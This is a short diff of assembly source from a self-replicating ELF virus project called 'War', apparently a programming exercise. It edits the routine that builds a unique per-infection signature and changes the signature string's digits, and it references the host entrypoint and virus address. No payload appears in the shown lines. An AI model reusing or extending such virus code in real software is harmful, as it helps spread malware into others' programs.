@@ -197,8 +197,6 @@ section .text
 
     __F_set_unique_trace:
       ; rax = integer from atoi(signature)
-      ; primero que todo, sumamos 1 al valor del contador.
-      inc rax
       ; lo transformamos haciendo paranoias
       mov rcx, rax
       shl rcx, 13
@@ -750,7 +748,7 @@ section .text
     __F_data__end:
     Traza_position  equ     _finish - Traza
     fix_char        db      0
-    Traza           db      "War version 1.0 (c)oded by tomartin & carce-bo 00000000",0  ;46
+    Traza           db      "War version 1.0 (c)oded by tomartin & carce-bo 42069420",0  ;46
     Traza_len       equ     $ - Traza - 1 - 8 - 1
     host_entrypoint dq      _dummy_host_entrypoint
     virus_vaddr     dq      _start
